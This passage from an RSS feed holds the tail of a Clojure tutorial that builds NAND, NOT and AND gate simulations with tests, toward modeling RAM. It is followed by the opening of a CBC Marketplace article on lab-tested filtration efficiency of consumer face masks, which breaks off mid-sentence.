<span>(</span><span>defn</span><span> wire-nand-gate [state a b o]</span>
<span>  (</span><span>update</span><span> state </span><span>:nand-gates</span><span> conj {</span><span>:ins</span><span> [a b] </span><span>:out</span><span> o}))</span></code></pre><p>These are all the basic tools we need to “connect” a NAND gate into our circuit. Let’s try them out in the REPL:</p><pre><code><span>(</span><span>charges</span><span> (</span><span>-&gt;</span><span> empty-state</span>
<span>               (</span><span>set-charge</span><span> </span><span>:a</span><span> </span><span>1</span><span>)</span>
<span>               (</span><span>set-charge</span><span> </span><span>:b</span><span> </span><span>0</span><span>))</span>
<span>           [</span><span>:a</span><span> </span><span>:b</span><span>])</span>
<span>; =&gt; (1 0)</span>
<span>(</span><span>wire-nand-gate</span><span> empty-state </span><span>:a</span><span> </span><span>:b</span><span> </span><span>:c</span><span>)</span>
<span>; =&gt; {:charge-map {}, :nand-gates [{:ins [:a :b], :out :c}]}</span></code></pre><p>Nice! We can now “wire” up a circuit. Let’s run some electricity through it.</p><p>To figure out how to simulate electricity into our circuit, let’s remember our diagram again:</p><p><span><img src="https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc2NTU3LTk0NmYxYjAwLTBjOTItMTFlYi05NGZkLTNlM2JkMzI5OWYwNC5wbmc" alt="image"></span></p><p>One way we can model this is to imagine that electricity is like water: It “flows” from sources into wires, and “triggers” all the devices that are connected to those wires.</p><p>With a model like that, here’s what would happen if a charge was “triggered” on <code>a</code>:</p><ol><li>First, <code>a</code>‘s charge would update. </li><li>After that <code>a</code> ‘s charge would transfer to all the NAND gates that are connected to it. In this case, it would be our one NAND gate above.</li><li>Each NAND gate would then recompute its charge, and if it changed, trigger its output wire in turn. In our case that’s <code>c</code> </li><li>If <code>c</code> was connected to other <code>NAND</code> gates, those gates would trigger, and the process would continue.</li></ol><p>Now, this is a very naive view of how electricity works (2), but it’s good enough for us to model RAM!</p><p>Let’s translate this into code.</p><p>To do that, we need a way to model what a <code>NAND</code> gate does:</p><pre><code><span>(</span><span>defn</span><span> nand-output [a b]</span>
<span>  (</span><span>if</span><span> (</span><span>=</span><span> a b </span><span>1</span><span>) </span><span>0</span><span> </span><span>1</span><span>))</span></code></pre><pre><code><span>(</span><span>nand-output</span><span> </span><span>0</span><span> </span><span>0</span><span>)</span>
<span>; =&gt; 1</span>
<span>(</span><span>nand-output</span><span> </span><span>1</span><span> </span><span>1</span><span>)</span>
<span>; =&gt; 0</span></code></pre><p>Our <code>nand-output</code> function takes two input charges, and produces the output charge that a <code>NAND</code> gate would produce.</p><p>Next, we need a function to find all the <code>NAND</code> gates that are connected to a specific wire:</p><pre><code><span>(</span><span>defn</span><span> dependent-nand-gates [state wire]</span>
<span>  (</span><span>filter</span><span> </span>
<span>    (</span><span>fn</span><span> [{</span><span>:keys</span><span> [ins]}] (</span><span>some</span><span> #{wire} ins)) </span>
<span>    (</span><span>:nand-gates</span><span> state)))</span></code></pre><pre><code><span>(</span><span>dependent-nand-gates</span><span> (</span><span>wire-nand-gate</span><span> empty-state </span><span>:a</span><span> </span><span>:b</span><span> </span><span>:c</span><span>) </span><span>:a</span><span>)</span>
<span>; =&gt; ({:ins [:a :b], :out :c})</span></code></pre><p>This searches all of our <code>NAND</code> gates in our circuit, and finds the ones which are connected to a specific wire.</p><p>With that, we have what we need to implement <code>trigger</code>:</p><pre><code><span>(</span><span>declare</span><span> trigger-nand-gate)</span>
<span>(</span><span>defn</span><span> trigger</span>
<span>  ([state wire new-v]</span>
<span>   (</span><span>let</span><span> [old-charge (</span><span>charge</span><span> state wire)</span>
<span>         state' (</span><span>set-charge</span><span> state wire new-v)</span>
<span>         new-charge (</span><span>charge</span><span> state' wire)]</span>
<span>     (</span><span>if</span><span> (</span><span>=</span><span> old-charge new-charge)</span>
<span>       state'</span>
<span>       (</span><span>reduce</span><span> (</span><span>fn</span><span> [acc-state out] (</span><span>trigger-nand-gate</span><span> acc-state out))</span>
<span>               state'</span>
<span>               (</span><span>dependent-nand-gates</span><span> state' wire))))))</span></code></pre><p>This follows exactly the model we described: </p><ol><li>Update the charge of the wire that was triggered </li><li>Find all the <code>NAND</code>  gates that the wire was connected too</li><li>Trigger those <code>NAND</code> gates if needed. </li></ol><p>What’s left is to implement what a  <code>NAND</code> gate does when it is triggered:</p><pre><code><span>(</span><span>defn</span><span> trigger-nand-gate</span>
<span>  [state {</span><span>:keys</span><span> [ins out]}]</span>
<span>  (</span><span>let</span><span> [new-charge (</span><span>apply</span><span> nand-output (</span><span>charges</span><span> state ins))]</span>
<span>    (</span><span>trigger</span><span> state out new-charge)))</span></code></pre><p>This calculates the new charge of a  <code>NAND</code> gate, and triggers the <code>output</code> wire with that charge. </p><p>Great, we have a way to simulate charges flowing through NAND gates! </p><p>One final helper function: let’s create something that will will let us “trigger” many wires: </p><pre><code><span>(</span><span>defn</span><span> trigger-many [state wires charges]</span>
<span>  (</span><span>reduce</span>
<span>    (</span><span>fn</span><span> [acc-state [wire charge]]</span>
<span>      (</span><span>trigger</span><span> acc-state wire charge))</span>
<span>    state</span>
<span>    (</span><span>map</span><span> vector wires charges)))</span></code></pre><p>We’ll want to do this so much that it’s good to have around.</p><p>We have what we need to simulate a simple charge flowing through a NAND gate. Let’s write a test for that:</p><pre><code><span>(</span><span>deftest</span><span> test-nand-gate</span>
<span>  (</span><span>let</span><span> [s1 (</span><span>-&gt;</span><span> empty-state</span>
<span>               (</span><span>wire-nand-gate</span><span> </span><span>:a</span><span> </span><span>:b</span><span> </span><span>:o</span><span>)</span>
<span>               (</span><span>trigger-many</span><span> [</span><span>:a</span><span> </span><span>:b</span><span>] [</span><span>1</span><span> </span><span>0</span><span>]))</span>
<span>        s2 (</span><span>-&gt;</span><span> s1</span>
<span>               (</span><span>trigger</span><span> </span><span>:b</span><span> </span><span>1</span><span>))]</span>
<span>    (</span><span>testing</span><span> </span><span>"just a is on"</span>
<span>      (</span><span>is</span><span> (</span><span>=</span><span> '(</span><span>1</span><span> </span><span>0</span><span> </span><span>1</span><span>) (</span><span>charges</span><span> s1 [</span><span>:a</span><span> </span><span>:b</span><span> </span><span>:o</span><span>]))))</span>
<span>    (</span><span>testing</span><span> </span><span>"both a and b are on"</span>
<span>      (</span><span>is</span><span> (</span><span>=</span><span> '(</span><span>1</span><span> </span><span>1</span><span> </span><span>0</span><span>) (</span><span>charges</span><span> s2 [</span><span>:a</span><span> </span><span>:b</span><span> </span><span>:o</span><span>]))))))</span></code></pre><pre><code><span>; Ran 1 test containing 2 assertions.</span>
<span>; No failures.</span></code></pre><p>Works like a charm! </p><p>What would happen, if we took a NAND gate, and fed the <em>same</em> wire in both inputs? </p><p><span><img src="https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc2NTc3LTlkZjg4MzAwLTBjOTItMTFlYi04M2VmLTMwNDViYTQ1YWM5Mi5wbmc" alt="image"></span></p><p>Well, the output would end up being the opposite of its input. When <code>a</code> is zero, <code>c</code> is 1, when <code>a</code> is 1, <code>c</code> is 0. Boom, that happens to be a <code>NOT</code> gate. Here’s how that looks: </p><p><span><img src="https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc2NTk5LWEzZWU2NDAwLTBjOTItMTFlYi05YWFjLTYwM2E4MmQzNmVjNS5wbmc" alt="image"></span></p><p>To implement our <code>NOT</code> gate, we can do exactly as our diagram described: Feed the same wire to <em>both</em> inputs of a <code>NAND</code> gate: </p><pre><code><span>(</span><span>defn</span><span> wire-not-gate</span>
<span>  ([state a o]</span>
<span>   (</span><span>wire-nand-gate</span><span> state a a o)))</span></code></pre><p>🤯 1 line of code. If we test that out…</p><pre><code><span>(</span><span>deftest</span><span> test-not-gate</span>
<span>  (</span><span>let</span><span> [s1 (</span><span>-&gt;</span><span> empty-state</span>
<span>               (</span><span>wire-not-gate</span><span> </span><span>:a</span><span> </span><span>:o</span><span>)</span>
<span>               (</span><span>trigger</span><span> </span><span>:a</span><span> </span><span>0</span><span>))</span>
<span>        s2 (</span><span>-&gt;</span><span> s1</span>
<span>               (</span><span>trigger</span><span> </span><span>:a</span><span> </span><span>1</span><span>))]</span>
<span>    (</span><span>testing</span><span> </span><span>"a is off"</span>
<span>      (</span><span>is</span><span> (</span><span>=</span><span> '(</span><span>0</span><span> </span><span>1</span><span>) (</span><span>charges</span><span> s1 [</span><span>:a</span><span> </span><span>:o</span><span>]))))</span>
<span>    (</span><span>testing</span><span> </span><span>"a is on"</span>
<span>      (</span><span>is</span><span> (</span><span>=</span><span> '(</span><span>1</span><span> </span><span>0</span><span>) (</span><span>charges</span><span> s2 [</span><span>:a</span><span> </span><span>:o</span><span>]))))))</span></code></pre><pre><code><span>; Ran 1 test containing 2 assertions.</span>
<span>; No failures</span></code></pre><p>It works! Onwards.</p><p>What if we plugged the output of one <code>NAND</code> as the input of a <code>NOT</code> gate?</p><p><span><img src="https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc2NjQwLWI1ZDAwNzAwLTBjOTItMTFlYi04MzBhLWVjMzc1Zjk5Y2E1ZC5wbmc" alt="image"></span></p><p>Well, it would be opposite of a <code>NAND</code> gate: <code>d</code> would only be 1 when <em>both</em> <code>a</code> and <code>b</code> are 1. That’s the <code>AND</code> gate:</p><p><span><img src="https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc2NjU2LWJlMjg0MjAwLTBjOTItMTFlYi04N2Q2LTM0MTJhMDY4YWEyZS5wbmc" alt="image"></span></p><p>To implement <code>AND</code>, we can follow just that schematic: </p><pre><code><span>(</span><span>defn</span><span> wire-and-gate [state a b o]</span>
<span>  (</span><span>let</span><span> [nand-o </span><span>:c</span><span>]</span>
<span>    (</span><span>-&gt;</span><span> state</span>
<span>        (</span><span>wire-nand-gate</span><span> a b nand-o)</span>
<span>        (</span><span>wire-not-gate</span><span> nand-o o))))</span></code></pre><p>This would work…almost. The tricky thing here is that inside the function we have an “intermediary” wire <code>c</code>, which connects the <code>NAND</code> gate and <code>NOT</code> gate. If we made <em>two</em> <code>AND</code> gates for example, then they would share the same wire <code>:c</code>! </p><p>To fix this, let’s write some helper functions to create unique wires: </p><pre><code><span>(</span><span>def</span><span> _u (</span><span>atom</span><span> {}))</span>
<span>(</span><span>defn</span><span> uniq-n [k]</span>
<span>  (</span><span>swap!</span><span> _u update k (</span><span>fn</span><span> [i] (</span><span>inc</span><span> (</span><span>or</span><span> i </span><span>0</span><span>))))</span>
<span>  (</span><span>get</span><span> @_u k))</span>
<!-- -->
<span>(</span><span>defn</span><span> kw [&amp; args]</span>
<span>  (</span><span>-&gt;&gt;</span><span> args</span>
<span>       (</span><span>map</span><span> (</span><span>fn</span><span> [x] (</span><span>if</span><span> ((</span><span>some-fn</span><span> keyword? symbol?) x)</span>
<span>                      (</span><span>name</span><span> x)</span>
<span>                      x)))</span>
<span>       (</span><span>apply</span><span> str)</span>
<span>       keyword))</span>
<!-- -->
<span>(</span><span>defn</span><span> wire</span>
<span>  ([n]</span>
<span>   (</span><span>let</span><span> [i (</span><span>uniq-n</span><span> n)]</span>
<span>     (</span><span>if</span><span> (</span><span>&gt;</span><span> i </span><span>1</span><span>) (</span><span>kw</span><span> n </span><span>"#"</span><span> i) n))))</span></code></pre><p>Let’s see how it looks:</p><pre><code><span>[(</span><span>wire</span><span> </span><span>:a</span><span>) (</span><span>wire</span><span> </span><span>:a</span><span>)]</span>
<span>=&gt; [</span><span>:a</span><span> </span><span>:a#2</span><span>]</span></code></pre><p>Now if we create a wire with a name that already exists, it’ll add a nice little “#2” beside it. </p><p>Nice! Let’s use it in <code>wire-and-gate</code></p><pre><code><span>(</span><span>defn</span><span> wire-and-gate [state a b o]</span>
<span>  (</span><span>let</span><span> [nand-o (</span><span>wire</span><span> (</span><span>kw</span><span> a b </span><span>:and-nand-o</span><span>))]</span>
<span>    (</span><span>-&gt;</span><span> state</span>
<span>        (</span><span>wire-nand-gate</span><span> a b nand-o)</span>
<span>        (</span><span>wire-not-gate</span><span> nand-o o))))</span></code></pre><p>If we test this out… </p><pre><code><span>(</span><span>deftest</span><span> test-and-gate</span>
<span>  (</span><span>let</span><span> [s1 (</span><span>-&gt;</span><span> empty-state</span>
<span>               (</span><span>wire-and-gate</span><span> </span><span>:a</span><span> </span><span>:b</span><span> </span><span>:o</span><span>)</span>
<span>               (</span><span>trigger-many</span><span> [</span><span>:a</span><span> </span><span>:b</span><span>] [</span><span>1</span><span> </span><span>0</span><span>]))</span>
<span>        s2 (</span><span>-&gt;</span><span> s1</span>
<span>               (</span><span>trigger</span><span> </span><span>:b</span><span> </span><span>1</span><span>))]</span>
<span>    (</span><span>testing</span><span> </span><span>"just a is on"</span>
<span>      (</span><span>is</span><span> (</span><span>=</span><span> '(</span><span>1</span><span> </span><span>0</span><span> </span><span>0</span><span>) (</span><span>charges</span><span> s1 [</span><span>:a</span><span> </span><span>:b</span><span> </span><span>:o</span><span>]))))</span>
<span>    (</span><span>testing</span><span> </span><span>"a and b on"</span>
<span>      (</span><span>is</span><span> (</span><span>=</span><span> '(</span><span>1</span><span> </span><span>1</span><span> </span><span>1</span><span>) (</span><span>charges</span><span> s2 [</span><span>:a</span><span> </span><span>:b</span><span> </span><span>:o</span><span>]))))))</span></code></pre><pre><code><span>; …</span></code></pre></span></p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://stopa.io/post/258">https://stopa.io/post/258</a></em></p>]]>
            </description>
            <link>https://stopa.io/post/258</link>
            <guid isPermaLink="false">hacker-news-small-sites-25086256</guid>
            <pubDate>Fri, 13 Nov 2020 19:20:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Twenty different masks tested. Here's what will best protect during the pandemic]]>
            </title>
            <description>
<![CDATA[
Score 23 | Comments 7 (<a href="https://news.ycombinator.com/item?id=25085480">thread link</a>) | @pseudolus
<br/>
November 13, 2020 | https://www.cbc.ca/news/canada/marketplace-masks-test-1.5795481 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/canada/marketplace-masks-test-1.5795481">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Public health officials have said masks are critical to reducing the spread of COVID-19, but rigorous tests conducted on behalf of CBC's Marketplace found that while some work very well, others offer little protection from particles that transmit the novel coronavirus. And one type of mask can even spread the particles to others.</p><div><figure><div><p><img loading="lazy" alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5795496.1604949380!/fileImage/httpImage/image.png_gen/derivatives/16x9_780/mask-grid.png"></p></div><figcaption>A selection of some of the masks Marketplace tested.<!-- --> <!-- -->(CBC)</figcaption></figure><p><span><p>Wearing a mask is critical to reducing the spread of COVID-19, but&nbsp;rigorous tests conducted on behalf of CBC's <em>Marketplace</em> found that while some work very well, others&nbsp;offer little protection from the particles that transmit the novel coronavirus. One type of mask can even spread those particles to others.</p>  <p>Months into the pandemic, there are still no standards for consumer masks. So <em>Marketplace</em> opted to compare more than two-dozen masks to what is commonly considered the gold standard in protecting health-care workers from infectious diseases like COVID-19 —&nbsp;the N95 mask.&nbsp;</p>  <p><em>Marketplace</em> purchased the masks in stores and online from a variety of sellers. The masks were also made out of varying materials and featured different designs.&nbsp;</p>  <p><em>Marketplace</em> put the masks through the rigorous National Institute for Occupational Safety and Health (NIOSH) standard test, conducted at a lower air-flow regimen to reflect normal breathing. The test is usually reserved for N95s and personal protective equipment (PPE) intended for health-care workers. A standard <a href="https://www.cdc.gov/niosh/npptl/stps/pdfs/TEB-APR-STP-0059-508.pdf"><u>NIOSH aerosol tes</u></a>t measures filtration efficiency, meaning the quantity of particles the mask filters out as the wearer breathes in.&nbsp;</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5795516.1604950465!/fileImage/httpImage/image.png_gen/derivatives/original_300/marketplace-masks-lab-tests.png 300w,https://i.cbc.ca/1.5795516.1604950465!/fileImage/httpImage/image.png_gen/derivatives/original_460/marketplace-masks-lab-tests.png 460w,https://i.cbc.ca/1.5795516.1604950465!/fileImage/httpImage/image.png_gen/derivatives/original_620/marketplace-masks-lab-tests.png 620w,https://i.cbc.ca/1.5795516.1604950465!/fileImage/httpImage/image.png_gen/derivatives/original_780/marketplace-masks-lab-tests.png 780w,https://i.cbc.ca/1.5795516.1604950465!/fileImage/httpImage/image.png_gen/derivatives/original_1180/marketplace-masks-lab-tests.png 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5795516.1604950465!/fileImage/httpImage/image.png_gen/derivatives/original_780/marketplace-masks-lab-tests.png"></p></div><figcaption>An image shows leakage from an ill-fitting mask during Marketplace’s lab test at the University of Toronto’s Dalla Lana School of Public Health. <!-- --> <!-- -->(CBC)</figcaption></figure></span></p>  <p>An N95 mask must have a 95 per cent filtration efficiency.&nbsp;</p>  <p>"This is the benchmark test. And it's actually useful because it allows us to compare consumer market masks to masks that we know a lot about," said&nbsp;James Scott, a professor from the University of Toronto's Dalla Lana School of Public Health. Scott is a specialist in bioaerosols and runs the lab where <em>Marketplace</em>'s tests were run.</p>  <ul>   <li><strong>Watch <em>Marketplace</em> Fridays at 8:00&nbsp;p.m., 8:30 p.m. NT, or stream&nbsp;any time&nbsp;on <a href="https://gem.cbc.ca/season/marketplace/season-47/8984c269-dae4-4a7b-b23a-d7df38647f09">CBC Gem</a></strong></li>  </ul>  <p>The test pulls a constant breath of air containing tiny salt particles through the mask material. The salt particles are similar in size to particles able to contain the coronavirus that might originate from droplets expelled by an infected person's breath, cough or sneeze. During the test, samples of air inside and outside the mask are compared to see how effective the mask is at reducing the level of particles.</p>  <p>Previous tests on consumer masks have commonly&nbsp;looked at how masks can help block particles&nbsp;when coughing or sneezing and&nbsp;prevent transmission to others.&nbsp;But the <em>Marketplace </em>test&nbsp;shows that certain materials make some masks better at limiting wearers'&nbsp;exposure by filtering what they&nbsp;breathe in, Scott said.</p>  <p>"Even fairly low-efficiency masks are actually quite effective at catching much larger particles. But, it takes a really good mask to catch the small ones as well. And we know that the virus will travel not only on the big ones but the small ones as well," said Scott.</p>  <p><em><strong>PHOTOS | A closer look at filtration efficiency of mask materials:</strong></em></p>    <h2>Results</h2>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5799764.1605212545!/fileImage/httpImage/image.png_gen/derivatives/original_300/masks-graphic.png 300w,https://i.cbc.ca/1.5799764.1605212545!/fileImage/httpImage/image.png_gen/derivatives/original_460/masks-graphic.png 460w,https://i.cbc.ca/1.5799764.1605212545!/fileImage/httpImage/image.png_gen/derivatives/original_620/masks-graphic.png 620w,https://i.cbc.ca/1.5799764.1605212545!/fileImage/httpImage/image.png_gen/derivatives/original_780/masks-graphic.png 780w,https://i.cbc.ca/1.5799764.1605212545!/fileImage/httpImage/image.png_gen/derivatives/original_1180/masks-graphic.png 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5799764.1605212545!/fileImage/httpImage/image.png_gen/derivatives/original_780/masks-graphic.png"></p></div><figcaption> <!-- -->(CBC)</figcaption></figure></span></p>  <h2>Polypropylene fabric masks as good as N95</h2>  <p><em>Marketplace</em>'s test found some masks are just as good as an N95 when it comes to filtering out those potentially harmful particles, including one made with something called polypropylene fabric.&nbsp;</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5795523.1604950756!/fileImage/httpImage/image.png_gen/derivatives/original_300/polypropylene-mask.png 300w,https://i.cbc.ca/1.5795523.1604950756!/fileImage/httpImage/image.png_gen/derivatives/original_460/polypropylene-mask.png 460w,https://i.cbc.ca/1.5795523.1604950756!/fileImage/httpImage/image.png_gen/derivatives/original_620/polypropylene-mask.png 620w,https://i.cbc.ca/1.5795523.1604950756!/fileImage/httpImage/image.png_gen/derivatives/original_780/polypropylene-mask.png 780w,https://i.cbc.ca/1.5795523.1604950756!/fileImage/httpImage/image.png_gen/derivatives/original_1180/polypropylene-mask.png 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5795523.1604950756!/fileImage/httpImage/image.png_gen/derivatives/original_780/polypropylene-mask.png"></p></div><figcaption>A mask with an inner layer of melt-blown non-woven polypropylene and outer layers of cotton.<!-- --> <!-- -->(CBC)</figcaption></figure></span></p>  <p>Polypropylene fabric, in this case, is a melt-blown, non-woven plastic fabric. Melt-blown, non-woven polypropylene (NWPP) is <a href="https://www.mckinsey.com/~/media/McKinsey/About%20Us/COVID%20Response%20Center/PDFs/COVID-19-PPE-Ops-Airway-Protection.pdf"><u>commonly used in surgical and N95 masks.</u></a></p>  <p>The consumer mask <em>Marketplace</em> tested with an inner layer of melt-blown, non-woven polypropylene fabric and outer layers of cotton had filtration efficiency rates as high as an N95. Scott said the combination of multiple materials contributed to the strong result.&nbsp;</p>  <p>"This is a really good example of multiple layers of different materials combining to make something greater than the sum of the parts," said Scott.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5795527.1604950877!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/blue-three-ply-mask.jpg 300w,https://i.cbc.ca/1.5795527.1604950877!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/blue-three-ply-mask.jpg 460w,https://i.cbc.ca/1.5795527.1604950877!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/blue-three-ply-mask.jpg 620w,https://i.cbc.ca/1.5795527.1604950877!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/blue-three-ply-mask.jpg 780w,https://i.cbc.ca/1.5795527.1604950877!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/blue-three-ply-mask.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5795527.1604950877!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/blue-three-ply-mask.jpg"></p></div><figcaption>An example of a blue three-ply surgical-type mask Marketplace tested.  <!-- --> <!-- -->(CBC)</figcaption></figure></span></p>  <h2>Blue three-ply surgical-type masks</h2>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5795529.1604950989!/fileImage/httpImage/image.png_gen/derivatives/original_300/2-ply-high-thread-count-cotton-mask.png 300w,https://i.cbc.ca/1.5795529.1604950989!/fileImage/httpImage/image.png_gen/derivatives/original_460/2-ply-high-thread-count-cotton-mask.png 460w,https://i.cbc.ca/1.5795529.1604950989!/fileImage/httpImage/image.png_gen/derivatives/original_620/2-ply-high-thread-count-cotton-mask.png 620w,https://i.cbc.ca/1.5795529.1604950989!/fileImage/httpImage/image.png_gen/derivatives/original_780/2-ply-high-thread-count-cotton-mask.png 780w,https://i.cbc.ca/1.5795529.1604950989!/fileImage/httpImage/image.png_gen/derivatives/original_1180/2-ply-high-thread-count-cotton-mask.png 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5795529.1604950989!/fileImage/httpImage/image.png_gen/derivatives/original_780/2-ply-high-thread-count-cotton-mask.png"></p></div><figcaption>One of the two-ply, high thread count cotton masks Marketplace tested.<!-- --> <!-- -->(CBC)</figcaption></figure></span></p>  <p>Blue three-ply surgical-type disposable masks also reported some of the highest filtration efficiency rates in the <em>Marketplace</em> test, which was of no surprise to Scott, as most contain that melt-blown, non-woven polypropylene fabric.&nbsp;</p>  <p>"It's this interwoven matrix of fibre. Air needs to travel around each one of those fibres and it meets the next fibre and it needs to bend its path. So as it does that, those fabrics pull out lots and lots of particles," said Scott.</p>  <h2>Two-ply and three-ply cotton masks&nbsp;</h2>  <p><em>Marketplace</em> also tested a number of cotton masks, including a two-layer, 100 per cent cotton mask, and a three-layer, 100 per cent cotton mask. More layers of cotton didn't necessarily mean a better mask. The three-layer cotton mask <em>Marketplace</em> tested did not perform well, but the two-layer cotton mask did.&nbsp;</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5795534.1604951296!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/three-ply-cotton-mask.jpg 300w,https://i.cbc.ca/1.5795534.1604951296!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/three-ply-cotton-mask.jpg 460w,https://i.cbc.ca/1.5795534.1604951296!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/three-ply-cotton-mask.jpg 620w,https://i.cbc.ca/1.5795534.1604951296!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/three-ply-cotton-mask.jpg 780w,https://i.cbc.ca/1.5795534.1604951296!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/three-ply-cotton-mask.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5795534.1604951296!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/three-ply-cotton-mask.jpg"></p></div><figcaption>One of the three-ply cotton masks Marketplace tested. Thread count unknown.<!-- --> <!-- -->(CBC)</figcaption></figure></span></p>  <p>There was also a noticeable jump in filtration efficiency in cotton masks made with a higher thread count.</p>  <p>Masks made with 600 and 680 thread count cotton had filtration efficiencies almost twice that of the other cotton masks tested. Scott said the weave of a fabric is critical when it comes to catching those potentially harmful particles.&nbsp;</p>  <p>When it comes to cotton masks, <em>Marketplace</em>'s test suggested&nbsp;the tighter the weave, the better.&nbsp;</p>  <p>Scott points out that manufacturers of consumer masks are not currently required to disclose details about thread count, and without that information it's difficult to say for certain what contributed to some cotton masks' poorer performance.&nbsp;</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5795575.1604952606!/fileImage/httpImage/image.png_gen/derivatives/original_300/valve-masks.png 300w,https://i.cbc.ca/1.5795575.1604952606!/fileImage/httpImage/image.png_gen/derivatives/original_460/valve-masks.png 460w,https://i.cbc.ca/1.5795575.1604952606!/fileImage/httpImage/image.png_gen/derivatives/original_620/valve-masks.png 620w,https://i.cbc.ca/1.5795575.1604952606!/fileImage/httpImage/image.png_gen/derivatives/original_780/valve-masks.png 780w,https://i.cbc.ca/1.5795575.1604952606!/fileImage/httpImage/image.png_gen/derivatives/original_1180/valve-masks.png 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5795575.1604952606!/fileImage/httpImage/image.png_gen/derivatives/original_780/valve-masks.png"></p></div><figcaption>Valve masks, like the one seen here, are not effective at blocking COVID-19.<!-- --> <!-- -->(CBC)</figcaption></figure></span></p>  <h2>Masks to avoid</h2>  <p>Scott said consumers should avoid wearing valve masks. While they are useful for protecting someone from inhaling paint fumes or when working in a wood shop, they do not help control the spread of the virus.</p>  <p>The reason is simple.&nbsp;</p>  <p>"Air only moves through the filter part of the mask when air comes in. It doesn't move through the filter to exhale. It moves through the valve," he said. "So there's nothing to intercept those particles that you may be shedding into the environment."</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5795580.1604952847!/fileImage/httpImage/image.png_gen/derivatives/original_300/valve-masks-pm-security-detail.png 300w,https://i.cbc.ca/1.5795580.1604952847!/fileImage/httpImage/image.png_gen/derivatives/original_460/valve-masks-pm-security-detail.png 460w,https://i.cbc.ca/1.5795580.1604952847!/fileImage/httpImage/image.png_gen/derivatives/original_620/valve-masks-pm-security-detail.png 620w,https://i.cbc.ca/1.5795580.1604952847!/fileImage/httpImage/image.png_gen/derivatives/original_780/valve-masks-pm-security-detail.png 780w,https://i.cbc.ca/1.5795580.1604952847!/fileImage/httpImage/image.png_gen/derivatives/original_1180/valve-masks-pm-security-detail.png 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5795580.1604952847!/fileImage/httpImage/image.png_gen/derivatives/original_780/valve-masks-pm-security-detail.png"></p></div><figcaption>Although valve masks are not recommended by the Public Health Agency of Canada, some members of the federal security force at Canada’s Parliament in Ottawa were seen wearing them.<!-- --> <!-- -->(CBC)</figcaption></figure></span></p>  <p><a href="https://www.torontopearson.com/en/whats-happening/stories/change-in-mask-regulations"><u>Transport Canada</u></a> has banned the wearing of valve masks, as has <a href="https://www.viarail.ca/en/preventive-measures-COVID-19#in-station"><u>Via Rail</u></a>, and airlines such as <a href="https://www.aircanada.com/ca/en/aco/home/book/travel-news-and-updates/2020/travelguidelines.html"><u>Air Canada</u></a>. <a href="https://www.toronto.ca/wp-content/uploads/2020/04/97f8-COVID-19-Guidance-for-Use-of-Face-Masks-and-Coverings-by-Public.pdf"><u>Toronto</u></a>, <a href="https://www.ottawapublichealth.ca/en/public-health-topics/masks.aspx"><u>Ottawa Public Health</u></a>, <a href="https://www.hamilton.ca/coronavirus/face-coverings-and-masks"><u>Hamilton Public Health</u></a> and the <a 